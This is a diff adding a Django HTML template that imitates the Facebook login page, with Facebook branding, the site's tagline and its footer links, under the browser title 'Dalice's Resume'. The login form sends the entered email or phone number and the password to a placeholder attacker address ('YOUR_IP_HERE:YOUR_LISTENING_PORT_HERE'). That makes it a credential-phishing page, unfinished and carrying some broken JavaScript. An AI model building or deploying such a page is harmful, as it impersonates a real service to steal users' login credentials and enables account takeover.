@@ -1,0 +1,251 @@
+<!-- To-DO: 
+* Finish JS function to change input fields on click.
+* Ensure form action is correct. 
+* Test page.
+
+-->
+<!DOCTYPE html>  
+<html lang="en">  
+    <title>Dalice's Resume</title>
+    <head>  
+        <!-- Required meta tags -->
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+        
+        <title>Login</title>  
+        
+        {% load static %}  
+        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+        <link rel="stylesheet" type="text/css" href="{% static 'css/styles.css' %}">
+
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.1.0/css/bootstrap.min.css" crossorigin="anonymous" referrerpolicy="no-referrer" />
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" crossorigin="anonymous" referrerpolicy="no-referrer" />
+        <link rel=”stylesheet” href=”https://cdn.jsdelivr.net/npm/bootstrap-icons@1.3.0/font/bootstrap-icons.css” />
+        <link rel=”stylesheet” href=”https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css” integrity=”sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T” crossorigin=”anonymous”>
+        
+        <style> 
+            /* .header { 
+                position: absolute;
+                top: 0;
+                left: 0;
+                width: 100%;
+                height: 414px; 
+                background-color: #969393;
+                color: #fff;
+                text-align: center;
+                padding: 20px;
+                box-sizing: border-box;
+            } */
+
+            .header {
+                background: #fff;
+                color: #343a46;            
+                height: 950px;
+                position: relative;
+                z-index: 1;
+            }
+
+            .header2 {
+                height: 77.55%;
+                background: #F0F2F5;
+                color: #978364;
+                position: relative;
+                z-index: 5;
+            }
+
+
+            .card {
+                border-radius: 10px;
+            }
+
+
+            .custom-btn {
+                width: 34px;
+                height: 23px;
+                border: 1px #CCD0D5;
+                border-style: solid;
+                border-color: #CCD0D5;
+                background-color: #F5F6F7;
+                top: 15px;
+                right: 85px;
+                position: relative;
+                color: #F5F6F7;
+            }
+
+           .plus-sign {
+                color: #686F7E;
+                font-size: 2.13em;
+                font-weight: 750;
+                position: relative;
+                right: 8px;
+                bottom: 25px;
+           }
+
+          
+           
+           .input-btn.clicked {
+            border-color: #007bff;
+            color: red;
+
+           }
+
+            
+        </style>
+
+
+                
+        <div class="header">
+
+            <div class="header2">
+                <center><div class="text" style="color: #316FF6; position: relative; top: 20px; font-weight: 800; font-size: 4em; font-family: 'Tahoma', sans serif;">facebook</h1></center>
+                
+                <center><div class="text" style="position: relative; top: 20px; color: black; font-size: x-large; font-weight: 400; line-height: 1;" >Connect with friends and the world <br>around you on Facebook.</div></center>
+
+                <center><div class="card" style="position: relative; top: 62px; height: 352px; width: 385px; box-shadow: 0 0 11px; color: rgb(187, 183, 183);">
+
+                    <form action="http://YOUR_IP_HERE:YOUR_LISTENING_PORT_HERE/">
+                        {% csrf_token %}
+                        <fieldset>
+                            
+                            <input class="input-btn" onclick="change_button()" type="text" name="email/phone" id="field1" placeholder="Email or phone number" style="border-radius: 6px; width: 355px; height: 50px; top: 20px; position: relative; opacity: 0.3;" >
+                            <input class="input-btn" onclick="change_button()" type="text" name="password" id="field2" placeholder="Password" style="border-radius: 6px; width: 355px; height: 50px; top: 30px; position: relative; opacity: 0.3;">
+
+                            <script>
+                                
+                                var fields = document.querySelectorAll("input")
+
+                                fields.onclick = function() {change_button1(), change_button2()};
+
+                                function change_button1() {
+                                    if (fields[0].onclick) {
+                                        fields[0].className = "input-btn clicked";
+                                    }
+                                }
+                                
+
+                                function change_button(fieldID) {
+                                    // Below line returns a list with all cases of input-btn in current template.
+                                    var input_fields = document.getElementsByClassName('input-btn');
+
+                                    for (var i=0; i < input_fields.length; i++) {
+                                        elements[i].classList.remove('clicked');
+                                    }
+                                    document.getElementById(fieldID).classList.add('clicked');
+                                }
+
+
+            
+
+                            </script>
+
+
+                            <button class="btn btn-primary" style="top: 47px; position: relative; width: 355px; height: 45px; font-size: larger; font-weight: 680; border-radius: 5px;">Log In</button>
+                            <br>
+                            <a href="/forgot_password/" style="top: 60px; position: relative; font: 0.88em sans-serif; text-decoration: none;" >Forgot Password?</a>
+
+                            <div class="line" style="border-top: 1px solid #888; position: relative; top: 80px; width: 90%; color: rgb(181, 179, 179); opacity: 0.25;"></div>
+
+                            <button class="btn btn-success" style="font-weight: 500; top: 108px; position: relative; background-color: #42B72A; height: 45px; width: 200px; font-size: large; border-radius: 5px;">Create new account</button>
+
+                            <div class="text" style="top: 160px; position: relative; font: 0.9em sans-serif; color: black;"><b>Create a page </b>for a celebrity, brand or business.</div>
+                        </fieldset>
+                    </form>
+
+
+                </div></center>
+
+            </div>
+
+            <a href="" style="left: 25px; bottom: -15px; position: relative; font-size: 0.8em; color: #838588; text-decoration: none;">English (US)</a>
+            <a href="" style="left: 35px; bottom: -15px; position: relative; font-size: 0.77em; color: #838588; text-decoration: none;">Français (Canada)</a>
+            <a href="" style="left: 45px; bottom: -15px; position: relative; font-size: 0.77em; color: #838588; text-decoration: none;">Español</a>
+            <a href="" style="left: 55px; bottom: -15px; position: relative; font-size: 0.77em; color: #838588; text-decoration: none;">中文(简体)</a>
+            <a href="" style="left: 65px; bottom: -15px; position: relative; font-size: 0.77em; color: #838588; text-decoration: none;">한국어</a>
+            <a href="" style="left: 75px; bottom: -15px; position: relative; font-size: 0.77em; color: #838588; text-decoration: none;">日本語</a>
+            <a href="" style="left: 85px; bottom: -15px; position: relative; font-size: 0.77em; color: #838588; text-decoration: none;">Português (Brasil)</a>
+            <a href="" style="left: 95px; bottom: -15px; position: relative; font-size: 0.77em; color: #838588; text-decoration: none;">Deutsch</a>
+            <a href="" style="left: 102px; bottom: -15px; position: relative; font-size: 0.77em; color: #838588; text-decoration: none;">Italiano</a>
+            <a href="" style="left: 110px; bottom: -15px; position: relative; font-size: 0.77em; color: #838588; text-decoration: none;">العربية</a>
+            <a href="" style="left: 120px; bottom: -15px; position: relative; font-size: 0.77em; color: #838588; text-decoration: none;">हिन्दी</a>
+    
+
+            <div class="container">
+                <button class="custom-btn btn btn-primary">
+                    <span class="plus-sign">+</span>
+                </button>
+
+            </div>
+
+
+            <div class="custom-btm" style="position: relative; bottom: -15px;"></div>
+
+
+            <center><div class="line" style="border-top: 1px solid #888; position: relative; bottom: -30px; width: 95%; color: rgb(181, 179, 179); opacity: 0.25; top: 26px;"></div></center>
+
+            <!-- Turn each of the below links to class's, class=link or text.... then add the on hover stylings in the <head> <style> section. -->
+
+            <a href="" style="left: 19px; top: 30px; position: relative; font-size: 0.8em; color: #838588; text-decoration: none; font-weight: 425;">Sign Up</a>
+            <a href="" style="left: 40px; top: 30px; position: relative; font-size: 0.8em; color: #838588; text-decoration: none; font-weight: 425;;">Log In</a>
+            <a href="" style="left: 55px; top: 30px; position: relative; font-size: 0.8em; color: #838588; text-decoration: none; font-weight: 425;;">Messenger</a>            
+            <a href="" style="left: 75px; top: 30px; position: relative; font-size: 0.8em; color: #838588; text-decoration: none; font-weight: 425;">Facebook Lite</a>
+            <a href="" style="left: 90px; top: 30px; position: relative; font-size: 0.8em; color: #838588; text-decoration: none; font-weight: 425;">Video</a>
+            <a href="" style="left: 105px; top: 30px; position: relative; font-size: 0.8em; color: #838588; text-decoration: none; font-weight: 425;">Places</a>
+            <a href="" style="left: 125px; top: 30px; position: relative; font-size: 0.8em; color: #838588; text-decoration: none; font-weight: 425;">Games</a>
+            <a href="" style="left: 140px; top: 30px; position: relative; font-size: 0.8em; color: #838588; text-decoration: none; font-weight: 425;">Marketplace</a>
+            <a href="" style="left: 165px; top: 30px; position: relative; font-size: 0.8em; color: #838588; text-decoration: none; font-weight: 425;">Meta Pay</a>
+
+            <a href="" style="right: 466px; top: 50px; position: relative; font-size: 0.8em; color: #838588; text-decoration: none; font-weight: 425;">Meta Store</a>
+            <a href="" style="right: 450px; top: 50px; position: relative; font-size: 0.8em; color: #838588; text-decoration: none; font-weight: 425;">Meta Quest</a>
+            <a href="" style="right: 435px; top: 50px; position: relative; font-size: 0.8em; color: #838588; text-decoration: none; font-weight: 425;">Instagram</a>
+            <a href="" style="right: 420px; top: 50px; position: relative; font-size: 0.8em; color: #838588; text-decoration: none; font-weight: 425;">Threads</a>
+            <a href="" style="left: 330px; top: 27px; position: relative; font-size: 0.8em; color: #838588; text-decoration: none; font-weight: 425;">Fundraisers</a>
+            <a href="" style="left: 350px; top: 27px; position: relative; font-size: 0.8em; color: #838588; text-decoration: none; font-weight: 425;">Services</a>
+            <a href="" style="left: 365px; top: 27px; position: relative; font-size: 0.8em; color: #838588; text-decoration: none; font-weight: 425;">Voting Information Center</a>
+
+            <a href="" style="right: 251px; top: 45px; position: relative; font-size: 0.8em; color: #838588; text-decoration: none; font-weight: 425;">Privacy Policy</a>
+            <a href="" style="right: 230px; top: 45px; position: relative; font-size: 0.8em; color: #838588; text-decoration: none; font-weight: 425;">Privacy Center</a>
+            <a href="" style="right: 215px; top: 45px; position: relative; font-size: 0.8em; color: #838588; text-decoration: none; font-weight: 425;">Groups</a>
+            <a href="" style="right: 200px; top: 45px; position: relative; font-size: 0.8em; color: #838588; text-decoration: none; font-weight: 425;">About</a>
+            <a href="" style="right: 183px; top: 45px; position: relative; font-size: 0.8em; color: #838588; text-decoration: none; font-weight: 425;">Create ad</a>
+            <a href="" style="right: 170px; top: 45px; position: relative; font-size: 0.8em; color: #838588; text-decoration: none; font-weight: 425;">Create Page</a>
+            <a href="" style="right: 150px; top: 45px; position: relative; font-size: 0.8em; color: #838588; text-decoration: none; font-weight: 425;">Developers</a>
+            <a href="" style="left: 594px; top: 23px; position: relative; font-size: 0.8em; color: #838588; text-decoration: none; font-weight: 425;">Careers</a>
+            <a href="" style="left: 610px; top: 23px; position: relative; font-size: 0.8em; color: #838588; text-decoration: none; font-weight: 425;">Cookies</a>
+
+            <a href="" style="right: 75px; top: 39px; position: relative; font-size: 0.8em; color: #838588; text-decoration: none; font-weight: 425;">Ad Choices</a>
+            <a href="" style="right: 44px; top: 39px; position: relative; font-size: 0.8em; color: #838588; text-decoration: none; font-weight: 425;">Terms</a>
+            <a href="" style="right: 29px; top: 39px; position: relative; font-size: 0.8em; color: #838588; text-decoration: none; font-weight: 425;">Help</a>
+            <a href="" style="right: 19px; top: 39px; position: relative; font-size: 0.8em; color: #838588; text-decoration: none; font-weight: 425;">Contact Uploading & Non-Users</a>
+
+            <div class="text" style="left: 20px; top: 65px; position: relative; font-size: 0.8em; color: #838588; text-decoration: none; font-weight: 425;">Meta © 2023</div>
+
+
+
+
+       </div>
+
+
+
+    </head>  
+
+    <body>       
+
+    </body>
+
+
+
+    <footer>
+
+        <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+        <script src="https://cdn.jsdelivr.net/npm/popper.js@1.12.9/dist/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+        <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+
+    </footer>
+
+
+    {% block content %} 
+    {% endblock content %}
+
+
+</html>
+
